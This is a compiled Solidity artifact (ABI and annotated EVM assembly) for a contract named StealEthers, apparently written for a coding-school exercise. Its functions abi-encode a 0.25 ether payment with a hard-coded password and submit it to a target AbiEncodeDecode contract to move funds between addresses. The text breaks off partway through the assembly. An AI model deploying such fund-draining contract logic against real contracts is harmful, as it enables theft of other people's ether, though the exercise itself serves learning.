{
	"hackEthersByChatGPT.sol": {
		"StealEthers": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_abiEncodeDecode",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [
						{
							"internalType": "bytes",
							"name": "data",
							"type": "bytes"
						}
					],
					"name": "callSubmitEncodeData",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "receiver",
							"type": "address"
						}
					],
					"name": "prepareAndCallSubmitEncodeData",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"hackEthersByChatGPT.sol\":229:1159  contract StealEthers {... */\n  mstore(0x40, 0xa0)\n    /* \"hackEthersByChatGPT.sol\":333:468  constructor(address _abiEncodeDecode) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"hackEthersByChatGPT.sol\":416:432  _abiEncodeDecode */\n  dup1\n    /* \"hackEthersByChatGPT.sol\":381:396  abiEncodeDecode */\n  0x00\n  dup1\n    /* \"hackEthersByChatGPT.sol\":381:433  abiEncodeDecode = IAbiEncodeDecode(_abiEncodeDecode) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"hackEthersByChatGPT.sol\":451:461  msg.sender */\n  caller\n    /* \"hackEthersByChatGPT.sol\":443:461  owner = msg.sender */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x80\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  pop\n    /* \"hackEthersByChatGPT.sol\":333:468  constructor(address _abiEncodeDecode) {... */\n  pop\n    /* \"hackEthersByChatGPT.sol\":229:1159  contract StealEthers {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"hackEthersByChatGPT.sol\":229:1159  contract StealEthers {... */\ntag_6:\n  mload(0x80)\n  codecopy(0x00, dataOffset(sub_0), dataSize(sub_0))\n  0x00\n  assignImmutable(\"0x8e8fab5f003314da8d1873ea7720e8d9f47650136d916064d1edb8a11d682624\")\n  return(0x00, dataSize(sub_0))\nstop\n\nsub_0: assembly {\n        /* \"hackEthersByChatGPT.sol\":229:1159  contract StealEthers {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x155332f3\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x251b7850\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"hackEthersByChatGPT.sol\":584:704  function callSubmitEncodeData(bytes memory data) public onlyOwner{... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      stop\n        /* \"hackEthersByChatGPT.sol\":710:1157  function prepareAndCallSubmitEncodeData(... */\n    tag_4:\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      tag_12\n      jump\t// in\n    tag_9:\n      stop\n        /* \"hackEthersByChatGPT.sol\":584:704  function callSubmitEncodeData(bytes memory data) public onlyOwner{... */\n    tag_8:\n        /* \"hackEthersByChatGPT.sol\":527:532  owner */\n      immutable(\"0x8e8fab5f003314da8d1873ea7720e8d9f47650136d916064d1edb8a11d682624\")\n        /* \"hackEthersByChatGPT.sol\":513:532  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"hackEthersByChatGPT.sol\":513:523  msg.sender */\n      caller\n        /* \"hackEthersByChatGPT.sol\":513:532  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"hackEthersByChatGPT.sol\":505:560  require(msg.sender == owner, \"sorry, you're not owner\") */\n      tag_14\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_15\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_14:\n        /* \"hackEthersByChatGPT.sol\":659:674  abiEncodeDecode */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"hackEthersByChatGPT.sol\":659:691  abiEncodeDecode.submitEncodeData */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xcbec4896\n        /* \"hackEthersByChatGPT.sol\":692:696  data */\n      dup3\n        /* \"hackEthersByChatGPT.sol\":659:697  abiEncodeDecode.submitEncodeData(data) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_22:\n      pop\n      pop\n      pop\n      pop\n        /* \"hackEthersByChatGPT.sol\":584:704  function callSubmitEncodeData(bytes memory data) public onlyOwner{... */\n      pop\n      jump\t// out\n        /* \"hackEthersByChatGPT.sol\":710:1157  function prepareAndCallSubmitEncodeData(... */\n    tag_12:\n        /* \"hackEthersByChatGPT.sol\":527:532  owner */\n      immutable(\"0x8e8fab5f003314da8d1873ea7720e8d9f47650136d916064d1edb8a11d682624\")\n        /* \"hackEthersByChatGPT.sol\":513:532  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"hackEthersByChatGPT.sol\":513:523  msg.sender */\n      caller\n        /* \"hackEthersByChatGPT.sol\":513:532  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"hackEthersByChatGPT.sol\":505:560  require(msg.sender == owner, \"sorry, you're not owner\") */\n      tag_24\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_25\n      swap1\n      tag_16\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_24:\n        /* \"hackEthersByChatGPT.sol\":832:846  uint256 amount */\n      0x00\n        /* \"hackEthersByChatGPT.sol\":849:859  0.25 ether */\n      0x03782dace9d90000\n        /* \"hackEthersByChatGPT.sol\":832:859  uint256 amount = 0.25 ether */\n      swap1\n      pop\n        /* \"hackEthersByChatGPT.sol\":869:886  bytes32 _password */\n      0x00\n        /* \"hackEthersByChatGPT.sol\":869:918  bytes32 _password = \"appworks.school.4/10.encode\" */\n      0x617070776f726b732e7363686f6f6c2e342f31302e656e636f64650000000000\n      swap1\n      pop\n        /* \"hackEthersByChatGPT.sol\":928:967  IAbiEncodeDecode.Payment memory payment */\n      0x00\n        /* \"hackEthersByChatGPT.sol\":970:1046  IAbiEncodeDecode.Payment(... */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n        /* \"hackEthersByChatGPT.sol\":1008:1016  receiver */\n      dup6\n        /* \"hackEthersByChatGPT.sol\":970:1046  IAbiEncodeDecode.Payment(... */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n        /* \"hackEthersByChatGPT.sol\":1030:1036  amount */\n      dup5\n        /* \"hackEthersByChatGPT.sol\":970:1046  IAbiEncodeDecode.Payment(... */\n      dup2\n      mstore\n      pop\n        /* \"hackEthersByChatGPT.sol\":928:1046  IAbiEncodeDecode.Payment memory payment = IAbiEncodeDecode.Payment(... */\n      swap1\n      pop\n        /* \"hackEthersByChatGPT.sol\":1056:1073  bytes memory data */\n      0x00\n        /* \"hackEthersByChatGPT.sol\":1087:1093  sender */\n      dup6\n        /* \"hackEthersByChatGPT.sol\":1095:1102  payment */\n      dup3\n        /* \"hackEthersByChatGPT.sol\":1104:1113  _password */\n      dup5\n        /* \"hackEthersByChatGPT.sol\":1076:1114  abi.encode(sender, payment, _password) */\n      add(0x20, mload(0x40))\n      tag_27\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"hackEthersByChatGPT.sol\":1056:1114  bytes memory data = abi.encode(sender, payment, _password) */\n      swap1\n      pop\n        /* \"hackEthersByChatGPT.sol\":1124:1150  callSubmitEncodeData(data) */\n      tag_29\n        /* \"hackEthersByChatGPT.sol\":1145:1149  data */\n      dup2\n        /* \"hackEthersByChatGPT.sol\":1124:1144  callSubmitEncodeData */\n      tag_8\n        /* \"hackEthersByChatGPT.sol\":1124:1150  callSubmitEncodeData(data) */\n      jump\t// in\n    tag_29:\n        /* \"hackEthersByChatGPT.sol\":822:1157  {... */\n      pop\n      pop\n      pop\n      pop\n        /* \"hackEthersByChatGPT.sol\":710:1157  function prepareAndCallSubmitEncodeData(... */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:82   */\n    tag_30:\n        /* \"#utility.yul\":40:46   */\n      0x00\n        /* \"#utility.yul\":73:75   */\n      0x40\n        /* \"#utility.yul\":67:76   */\n      mload\n        /* \"#utility.yul\":57:76   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:82   */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_31:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":211:328   */\n    tag_32:\n        /* \"#utility.yul\":320:321   */\n      0x00\n        /* \"#utility.yul\":317:318   */\n      dup1\n        /* \"#utility.yul\":310:322   */\n      revert\n        /* \"#utility.yul\":334:451   */\n    tag_33:\n        /* \"#utility.yul\":443:444   */\n      0x00\n        /* \"#utility.yul\":440:441   */\n      dup1\n        /* \"#utility.yul\":433:445   */\n      revert\n        /* \"#utility.yul\":457:574   */\n    tag_34:\n        /* \"#utility.yul\":566:567   */\n      0x00\n        /* \"#utility.yul\":563:564   */\n      dup1\n        /* \"#utility.yul\":556:568   */\n      revert\n        /* \"#utility.yul\":580:682   */\n    tag_35:\n        /* \"#utility.yul\":621:627   */\n      0x00\n        /* \"#utility.yul\":672:674   */\n      0x1f\n        /* \"#utility.yul\":668:675   */\n      not\n        /* \"#utility.yul\":663:665   */\n      0x1f\n        /* \"#utility.yul\":656:661   */\n      dup4\n        /* \"#utility.yul\":652:666   */\n      add\n        /* \"#utility.yul\":648:676   */\n      and\n        /* \"#utility.yul\":638:676   */\n      swap1\n      pop\n        /* \"#utility.yul\":580:682   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":688:868   */\n    tag_36:\n        /* \"#utility.yul\":736:813   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":733:734   */\n      0x00\n        /* \"#utility.yul\":726:814   */\n      mstore\n        /* \"#utility.yul\":833:837   */\n      0x41\n        /* \"#utility.yul\":830:831   */\n      0x04\n        /* \"#utility.yul\":823:838   */\n      mstore\n        /* \"#utility.yul\":857:861   */\n      0x24\n        /* \"#utility.yul\":854:855   */\n      0x00\n        /* \"#utility.yul\":847:862   */\n      revert\n        /* \"#utility.yul\":874:1155   */\n    tag_37:\n        /* \"#utility.yul\":957:984   */\n      tag_70\n        /* \"#utility.yul\":979:983   */\n      dup3\n        /* \"#utility.yul\":957:984   */\n      tag_35\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":949:955   */\n      dup2\n        /* \"#utility.yul\":945:985   */\n      add\n        /* \"#utility.yul\":1087:1093   */\n      dup2\n        /* \"#utility.yul\":1075:1085   */\n      dup2\n        /* \"#utility.yul\":1072:1094   */\n      lt\n        /* \"#utility.yul\":1051:1069   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":1039:1049   */\n      dup3\n        /* \"#utility.yul\":1036:1070   */\n      gt\n        /* \"#utility.yul\":1033:1095   */\n      or\n        /* \"#utility.yul\":1030:1118   */\n      iszero\n      tag_71\n      jumpi\n        /* \"#utility.yul\":1098:1116   */\n      tag_72\n      tag_36\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":1030:1118   */\n    tag_71:\n        /* \"#utility.yul\":1138:1148   */\n      dup1\n        /* \"#utility.yul\":1134:1136   */\n      0x40\n        /* \"#utility.yul\":1127:1149   */\n      mstore\n        /* \"#utility.yul\":917:1155   */\n      pop\n        /* \"#utility.yul\":874:1155   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1161:1290   */\n    tag_38:\n        /* \"#utility.yul\":1195:1201   */\n      0x00\n        /* \"#utility.yul\":1222:1242   */\n      tag_74\n      tag_30\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":1212:1242   */\n      swap1\n      pop\n        /* \"#utility.yul\":1251:1284   */\n      tag_75\n        /* \"#utility.yul\":1279:1283   */\n      dup3\n        /* \"#utility.yul\":1271:1277   */\n      dup3\n        /* \"#utility.yul\":1251:1284   */\n      tag_37\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":1161:1290   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1296:1603   */\n    tag_39:\n        /* \"#utility.yul\":1357:1361   */\n      0x00\n        /* \"#utility.yul\":1447:1465   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":1439:1445   */\n      dup3\n        /* \"#utility.yul\":1436:1466   */\n      gt\n        /* \"#utility.yul\":1433:1489   */\n      iszero\n      tag_77\n      jumpi\n        /* \"#utility.yul\":1469:1487   */\n      tag_78\n      tag_36\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":1433:1489   */\n    tag_77:\n        /* \"#utility.yul\":1507:1536   */\n      tag_79\n        /* \"#utility.yul\":1529:1535   */\n      dup3\n        /* \"#utility.yul\":1507:1536   */\n      tag_35\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":1499:1536   */\n      swap1\n      pop\n        /* \"#utility.yul\":1591:1595   */\n      0x20\n        /* \"#utility.yul\":1585:1589   */\n      dup2\n        /* \"#utility.yul\":1581:1596   */\n      add\n        /* \"#utility.yul\":1573:1596   */\n      swap1\n      pop\n        /* \"#utility.yul\":1296:1603   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1609:1755   */\n    tag_40:\n        /* \"#utility.yul\":1706:1712   */\n      dup3\n        /* \"#utility.yul\":1701:1704   */\n      dup2\n        /* \"#utility.yul\":1696:1699   */\n      dup4\n        /* \"#utility.yul\":1683:1713   */\n      calldatacopy\n        /* \"#utility.yul\":1747:1748   */\n      0x00\n        /* \"#utility.yul\":1738:1744   */\n      dup4\n        /* \"#utility.yul\":1733:1736   */\n      dup4\n        /* \"#utility.yul\":1729:1745   */\n      add\n        /* \"#utility.yul\":1722:1749   */\n      mstore\n        /* \"#utility.yul\":1609:1755   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1761:2184   */\n    tag_41:\n        /* \"#utility.yul\":1838:1843   */\n      0x00\n        /* \"#utility.yul\":1863:1928   */\n      tag_82\n        /* \"#utility.yul\":1879:1927   */\n      tag_83\n        /* \"#utility.yul\":1920:1926   */\n      dup5\n        /* \"#utility.yul\":1879:1927   */\n      tag_39\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":1863:1928   */\n      tag_38\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":1854:1928   */\n      swap1\n      pop\n        /* \"#utility.yul\":1951:1957   */\n      dup3\n        /* \"#utility.yul\":1944:1949   */\n      dup2\n        /* \"#utility.yul\":1937:1958   */\n      mstore\n        /* \"#utility.yul\":1989:1993   */\n      0x20\n        /* \"#utility.yul\":1982:1987   */\n      dup2\n        /* \"#utility.yul\":1978:1994   */\n      add\n        /* \"#utility.yul\":2027:2030   */\n      dup5\n        /* \"#utility.yul\":2018:2024   */\n      dup5\n        /* \"#utility.yul\":2013:2016   */\n      dup5\n        /* \"#utility.yul\":2009:2025   */\n      add\n        /* \"#utility.yul\":2006:2031   */\n      gt\n        /* \"#utility.yul\":2003:2115   */\n      iszero\n      tag_84\n      jumpi\n        /* \"#utility.yul\":2034:2113   */\n      tag_85\n      tag_34\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":2003:2115   */\n    tag_84:\n        /* \"#utility.yul\":2124:2178   */\n      tag_86\n        /* \"#utility.yul\":2171:2177   */\n      dup5\n        /* \"#utility.yul\":2166:2169   */\n      dup3\n        /* \"#utility.yul\":2161:2164   */\n      dup6\n        /* \"#utility.yul\":2124:2178   */\n      tag_40\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":1844:2184   */\n      pop\n        /* \"#utility.yul\":1761:2184   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2203:2541   */\n    tag_42:\n        /* \"#utility.yul\":2258:2263   */\n      0x00\n        /* \"#utility.yul\":2307:2310   */\n      dup3\n        /* \"#utility.yul\":2300:2304   */\n      0x1f\n        /* \"#utility.yul\":2292:2298   */\n      dup4\n        /* \"#utility.yul\":2288:2305   */\n      add\n        /* \"#utility.yul\":2284:2311   */\n      slt\n        /* \"#utility.yul\":2274:2396   */\n      tag_88\n      jumpi\n        /* \"#utility.yul\":2315:2394   */\n      tag_89\n      tag_33\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":2274:2396   */\n    tag_88:\n        /* \"#utility.yul\":2432:2438   */\n      dup2\n        /* \"#utility.yul\":2419:2439   */\n      calldataload\n        /* \"#utility.yul\":2457:2535   */\n      tag_90\n        /* \"#utility.yul\":2531:2534   */\n      dup5\n        /* \"#utility.yul\":2523:2529   */\n      dup3\n        /* \"#utility.yul\":2516:2520   */\n      0x20\n        /* \"#utility.yul\":2508:2514   */\n      dup7\n        /* \"#utility.yul\":2504:2521   */\n      add\n        /* \"#utility.yul\":2457:2535   */\n      tag_41\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":2448:2535   */\n      swap2\n      pop\n        /* \"#utility.yul\":2264:2541   */\n      pop\n        /* \"#utility.yul\":2203:2541   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2547:3054   */\n    tag_7:\n        /* \"#utility.yul\":2615:2621   */\n      0x00\n        /* \"#utility.yul\":2664:2666   */\n      0x20\n        /* \"#utility.yul\":2652:2661   */\n      dup3\n        /* \"#utility.yul\":2643:2650   */\n      dup5\n        /* \"#utility.yul\":2639:2662   */\n      sub\n        /* \"#utility.yul\":2635:2667   */\n      slt\n        /* \"#utility.yul\":2632:2751   */\n      iszero\n      tag_92\n      jumpi\n        /* \"#utility.yul\":2670:2749   */\n      tag_93\n      tag_31\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":2632:2751   */\n    tag_92:\n        /* \"#utility.yul\":2818:2819   */\n      0x00\n        /* \"#utility.yul\":2807:2816   */\n      dup3\n        /* \"#utility.yul\":2803:2820   */\n      add\n        /* \"#utility.yul\":2790:2821   */\n      calldataload\n        /* \"#utility.yul\":2848:2866   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":2840:2846   */\n      dup2\n        /* \"#utility.yul\":2837:2867   */\n      gt\n        /* \"#utility.yul\":2834:2951   */\n      iszero\n      tag_94\n      jumpi\n        /* \"#utility.yul\":2870:2949   */\n      tag_95\n      tag_32\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":2834:2951   */\n    tag_94:\n        /* \"#utility.yul\":2975:3037   */\n      tag_96\n        /* \"#utility.yul\":3029:3036   */\n      dup5\n        /* \"#utility.yul\":3020:3026   */\n      dup3\n        /* \"#utility.yul\":3009:3018   */\n      dup6\n        /* \"#utility.yul\":3005:3027   */\n      add\n        /* \"#utility.yul\":2975:3037   */\n      tag_42\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":2965:3037   */\n      swap2\n      pop\n        /* \"#utility.yul\":2761:3047   */\n      pop\n        /* \"#utility.yul\":2547:3054   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3060:3186   */\n    tag_43:\n        /* \"#utility.yul\":3097:3104   */\n      0x00\n        /* \"#utility.yul\":3137:3179   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":3130:3135   */\n      dup3\n        /* \"#utility.yul\":3126:3180   */\n      and\n        /* \"#utility.yul\":3115:3180   */\n      swap1\n      pop\n        /* \"#utility.yul\":3060:3186   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3192:3288   */\n    tag_44:\n        /* \"#utility.yul\":3229:3236   */\n      0x00\n        /* \"#utility.yul\":3258:3282   */\n      tag_99\n        /* \"#utility.yul\":3276:3281   */\n      dup3\n        /* \"#utility.yul\":3258:3282   */\n      tag_43\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":3247:3282   */\n      swap1\n      pop\n        /* \"#utility.yul\":3192:3288   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3294:3416   */\n    tag_45:\n        /* \"#utility.yul\":3367:3391   */\n      tag_101\n        /* \"#utility.yul\":3385:3390   */\n      dup2\n        /* \"#utility.yul\":3367:3391   */\n      tag_44\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":3360:3365   */\n      dup2\n        /* \"#utility.yul\":3357:3392   */\n      eq\n        /* \"#utility.yul\":3347:3410   */\n      tag_102\n      jumpi\n        /* \"#utility.yul\":3406:3407   */\n      0x00\n        /* \"#utility.yul\":3403:3404   */\n      dup1\n        /* \"#utility.yul\":3396:3408   */\n      revert\n        /* \"#utility.yul\":3347:3410   */\n    tag_102:\n        /* \"#utility.yul\":3294:3416   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3422:3561   */\n    tag_46:\n        /* \"#utility.yul\":3468:3473   */\n      0x00\n        /* \"#utility.yul\":3506:3512   */\n      dup2\n        /* \"#utility.yul\":3493:3513   */\n      calldataload\n        /* \"#utility.yul\":3484:3513   */\n      swap1\n      pop\n        /* \"#utility.yul\":3522:3555   */\n      tag_104\n        /* \"#utility.yul\":3549:3554   */\n      dup2\n        /* \"#utility.yul\":3522:3555   */\n      tag_45\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":3422:3561   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3567:4041   */\n    tag_11:\n        /* \"#utility.yul\":3635:3641   */\n      0x00\n        /* \"#utility.yul\":3643:3649   */\n      dup1\n        /* \"#utility.yul\":3692:3694   */\n      0x40\n        /* \"#utility.yul\":3680:3689   */\n      dup4\n        /* \"#utility.yul\":3671:3678   */\n      dup6\n        /* \"#utility.yul\":3667:3690   */\n      sub\n        /* \"#utility.yul\":3663:3695   */\n      slt\n        /* \"#utility.yul\":3660:3779   */\n      iszero\n      tag_106\n      jumpi\n        /* \"#utility.yul\":3698:3777   */\n      tag_107\n      tag_31\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":3660:3779   */\n    tag_106:\n        /* \"#utility.yul\":3818:3819   */\n      0x00\n        /* \"#utility.yul\":3843:3896   */\n      tag_108\n        /* \"#utility.yul\":3888:3895   */\n      dup6\n        /* \"#utility.yul\":3879:3885   */\n      dup3\n        /* \"#utility.yul\":3868:3877   */\n      dup7\n        /* \"#utility.yul\":3864:3886   */\n      add\n        /* \"#utility.yul\":3843:3896   */\n      tag_46\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":3833:3896   */\n      swap3\n      pop\n        /* \"#utility.yul\":3789:3906   */\n      pop\n        /* \"#utility.yul\":3945:3947   */\n      0x20\n        /* \"#utility.yul\":3971:4024   */\n      tag_109\n        /* \"#utility.yul\":4016:4023   */\n      dup6\n        /* \"#utility.yul\":4007:4013   */\n      dup3\n        /* \"#utility.yul\":3996:4005   */\n      dup7\n        /* \"#utility.yul\":3992:4014   */\n      add\n        /* \"#utility.yul\":3971:4024   */\n      tag_46\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":3961:4024   */\n      swap2\n      pop\n        /* \"#utility.yul\":3916:4034   */\n      pop\n        /* \"#utility.yul\":3567:4041   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4047:4216   */\n    tag_47:\n        /* \"#utility.yul\":4131:4142   */\n      0x00\n        /* \"#utility.yul\":4165:4171   */\n      dup3\n        /* \"#utility.yul\":4160:4163   */\n      dup3\n        /* \"#utility.yul\":4153:4172   */\n      mstore\n        /* \"#utility.yul\":4205:4209   */\n      0x20\n        /* 